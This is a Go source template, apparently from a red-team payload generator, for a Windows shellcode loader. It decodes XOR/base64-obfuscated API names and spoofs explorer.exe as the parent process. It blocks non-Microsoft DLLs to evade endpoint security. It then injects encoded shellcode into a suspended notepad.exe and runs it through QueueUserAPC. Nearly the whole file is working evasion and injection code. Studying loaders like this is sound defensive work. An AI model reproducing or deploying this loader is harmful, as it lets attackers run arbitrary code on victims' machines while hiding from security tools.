// Heavily based on go4run by D00MFist: https://github.com/D00MFist/Go4aRun
package main

import (
	"encoding/base64"
	"golang.org/x/sys/windows"
	"strings"
	"syscall"
	"unsafe"
	_ "fmt"
	_ "math"
	_ "os"
)

const (
	TH32CS_SNAPPROCESS                   = 0x2
	PROCESS_ALL_ACCESS                   = 2035711
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
	errnoERROR_IO_PENDING                = 997
)

type WindowsProcess struct {
	ProcessID       int
	ParentProcessID int
	Exe             string
}

type StartupInfoEx struct {
	windows.StartupInfo
	AttributeList *PROC_THREAD_ATTRIBUTE_LIST
}

type PROC_THREAD_ATTRIBUTE_LIST struct {
	dwFlags  uint32
	size     uint64
	count    uint64
	reserved uint64
	unknown  *uint64
	entries  []*PROC_THREAD_ATTRIBUTE_ENTRY
}

type PROC_THREAD_ATTRIBUTE_ENTRY struct {
	attribute *uint32
	cbSize    uintptr
	lpValue   uintptr
}

var (
	kernel32                                = syscall.MustLoadDLL(encodeString(`{{encode "kernel32.dll" .Key }}`))
	virtualAllocEx                          = kernel32.MustFindProc(encodeString(`{{encode "VirtualAllocEx" .Key }}`))
	virtualProtectEx                        = kernel32.MustFindProc(encodeString(`{{encode "VirtualProtectEx" .Key }}`))
	writeProcessMemory                      = kernel32.MustFindProc(encodeString(`{{encode "WriteProcessMemory" .Key}}`))
	queueUserAPC                            = kernel32.MustFindProc(encodeString(`{{encode "QueueUserAPC" .Key }}`))
	createProcess                           = kernel32.MustFindProc(encodeString(`{{encode "CreateProcessW" .Key }}`))
	getProcessHeap                          = kernel32.MustFindProc(encodeString(`{{encode "GetProcessHeap" .Key }}`))
	heapAlloc                               = kernel32.MustFindProc(encodeString(`{{encode "HeapAlloc" .Key }}`))
	heapFree                                = kernel32.MustFindProc(encodeString(`{{encode "HeapFree" .Key }}`))
	initializeProcThreadAttributeList       = kernel32.MustFindProc(encodeString(`{{encode "InitializeProcThreadAttributeList" .Key }}`))
	updateProcThreadAttribute               = kernel32.MustFindProc(encodeString(`{{encode "UpdateProcThreadAttribute" .Key }}`))
	openProcess                             = kernel32.MustFindProc(encodeString(`{{encode "OpenProcess" .Key}}`))
	createRemoteThread                      = kernel32.MustFindProc(encodeString(`{{encode "CreateRemoteThread" .Key }}`))
	key                                     = "{{ .Key }}"
	errERROR_IO_PENDING               error = syscall.Errno(errnoERROR_IO_PENDING)
	errERROR_EINVAL                   error = syscall.EINVAL
)

func errnoErr(e syscall.Errno) error {
	switch e {
	case 0:
		return errERROR_EINVAL
	case errnoERROR_IO_PENDING:
		return errERROR_IO_PENDING
	}
	return e
}

func CreateProcess(appName *uint16,
	commandLine *uint16,
	procSecurity *windows.SecurityAttributes,
	threadSecurity *windows.SecurityAttributes,
	inheritHandles bool,
	creationFlags uint32,
	env *uint16,
	currentDir *uint16,
	startupInfo *StartupInfoEx,
	outProcInfo *windows.ProcessInformation) (err error) {
	var _p0 uint32
	if inheritHandles {
		_p0 = 1
	} else {
		_p0 = 0
	}
	r1, _, e1 := syscall.Syscall12(createProcess.Addr(),
		10,
		uintptr(unsafe.Pointer(appName)),
		uintptr(unsafe.Pointer(commandLine)),
		uintptr(unsafe.Pointer(procSecurity)),
		uintptr(unsafe.Pointer(threadSecurity)),
		uintptr(_p0),
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(env)),
		uintptr(unsafe.Pointer(currentDir)),
		uintptr(unsafe.Pointer(startupInfo)),
		uintptr(unsafe.Pointer(outProcInfo)),
		0,
		0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func InitializeProcThreadAttributeList(lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST,
	dwAttributeCount uint32,
	dwFlags uint32,
	lpSize *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall6(initializeProcThreadAttributeList.Addr(),
		4,
		uintptr(unsafe.Pointer(lpAttributeList)),
		uintptr(dwAttributeCount),
		uintptr(dwFlags),
		uintptr(unsafe.Pointer(lpSize)),
		0,
		0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func UpdateProcThreadAttribute(lpAttributeList *PROC_THREAD_ATTRIBUTE_LIST,
	dwFlags uint32,
	attribute uintptr,
	lpValue *uintptr,
	cbSize uintptr,
	lpPreviousValue uintptr,
	lpReturnSize *uintptr) (err error) {
	r1, _, e1 := syscall.Syscall9(updateProcThreadAttribute.Addr(),
		7,
		uintptr(unsafe.Pointer(lpAttributeList)),
		uintptr(dwFlags),
		uintptr(attribute),
		uintptr(unsafe.Pointer(lpValue)),
		uintptr(cbSize),
		uintptr(lpPreviousValue),
		uintptr(unsafe.Pointer(lpReturnSize)),
		0,
		0)
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func GetProcessHeap() (procHeap windows.Handle, err error) {
	r0, _, e1 := syscall.Syscall(getProcessHeap.Addr(), 0, 0, 0, 0)
	procHeap = windows.Handle(r0)
	if procHeap == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func HeapAlloc(hHeap windows.Handle,
	dwFlags uint32,
	dwBytes uintptr) (lpMem uintptr, err error) {
	r0, _, e1 := syscall.Syscall(heapAlloc.Addr(),
		3,
		uintptr(hHeap),
		uintptr(dwFlags),
		uintptr(dwBytes))
	lpMem = uintptr(r0)
	if lpMem == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func HeapFree(hHeap windows.Handle,
	dwFlags uint32,
	lpMem uintptr) (err error) {
	r1, _, e1 := syscall.Syscall(heapFree.Addr(), 3, uintptr(hHeap), uintptr(dwFlags), uintptr(lpMem))
	if r1 == 0 {
		if e1 != 0 {
			err = errnoErr(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func encodeString(s string) (res string) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res += string(tmp[i] ^ x[i%len(x)])
	}
	return
}

func encodeByteArray(s string) (res []byte) {
	tmp, _ := base64.StdEncoding.DecodeString(s)
	x, _ := base64.StdEncoding.DecodeString(key)
	for i := 0; i < len(tmp); i++ {
		res = append(res, tmp[i]^x[i%len(x)])
	}
	return
}

func getProcesses() ([]WindowsProcess, error) {
	handle, err := windows.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return nil, err
	}
	defer windows.CloseHandle(handle)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))
	err = windows.Process32First(handle, &entry)
	if err != nil {
		return nil, err
	}

	results := make([]WindowsProcess, 0, 50)

	for {
		results = append(results, newWindowsProcess(&entry))
		err = windows.Process32Next(handle, &entry)

		if err != nil {
			if err == syscall.ERROR_NO_MORE_FILES {
				return results, nil
			}
			return nil, err
		}
	}
}

func newWindowsProcess(e *windows.ProcessEntry32) WindowsProcess {
	end := 0
	for {
		if e.ExeFile[end] == 0 {
			break
		}
		end++
	}
	return WindowsProcess{
		ProcessID:       int(e.ProcessID),
		ParentProcessID: int(e.ParentProcessID),
		Exe:             syscall.UTF16ToString(e.ExeFile[:end]),
	}
}

func findProcessByName(processes []WindowsProcess, name string) *WindowsProcess {
	for _, p := range processes {
		if strings.ToLower(p.Exe) == strings.ToLower(name) {
			return &p
		}
	}
	return nil
}

func main() {
	sc := encodeByteArray("{{ .ShellcodeEncoded }}")
	n := {{ .Size }}

	procThreadAttributeSize := uintptr(0)
	InitializeProcThreadAttributeList(nil, 2, 0, &procThreadAttributeSize)

	procHeap, _ := GetProcessHeap()
	attributeList, _ := HeapAlloc(procHeap, 0, procThreadAttributeSize)
	defer HeapFree(procHeap, 0, attributeList)

	var startupInfo StartupInfoEx
	startupInfo.AttributeList = (*PROC_THREAD_ATTRIBUTE_LIST)(unsafe.Pointer(attributeList))
	InitializeProcThreadAttributeList(startupInfo.AttributeList, 2, 0, &procThreadAttributeSize)
	mitigate := 0x20007 //"PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"
	nonms := uintptr(0x100000000000)
	//onlystore := uintptr(0x300000000000)

	UpdateProcThreadAttribute(startupInfo.AttributeList, 0, uintptr(mitigate), &nonms, unsafe.Sizeof(nonms), 0, nil)

	procs, err := getProcesses()
	if err != nil {
		panic(err)
	}
	parentInfo := findProcessByName(procs, encodeString(`{{encode "explorer.exe" .Key }}`))

	if parentInfo != nil {
		ppid := uint32(parentInfo.ProcessID)
		parentHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, ppid)
		uintptrParentHandle := uintptr(parentHandle)

		UpdateProcThreadAttribute(startupInfo.AttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &uintptrParentHandle, unsafe.Sizeof(parentHandle), 0, nil)

		var procInfo windows.ProcessInformation
		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT

		victimProc := encodeString(`{{encode "C:\\Windows\\System32\\notepad.exe" .Key}}`)
		utf16ptrVictimProc, _ := windows.UTF16PtrFromString(victimProc)
		_ = CreateProcess(nil, utf16ptrVictimProc, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)

		threadHandle := uintptr(procInfo.Thread)
		targetHandle, _, _ := openProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(procInfo.ProcessId))

		addr, _, _ := virtualAllocEx.Call(uintptr(targetHandle), uintptr(0), uintptr(n), windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)

		var nWritten uintptr
		_, _, _ = writeProcessMemory.Call(uintptr(targetHandle), addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(n), uintptr(unsafe.Pointer(&nWritten)))

		var oldProtect uint32
		_, _, _ = virtualProtectEx.Call(uintptr(targetHandle), addr, uintptr(n), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

		_, _, _ = queueUserAPC.Call(addr, threadHandle, uintptr(0))
		windows.ResumeThread(procInfo.Thread)
	}
}
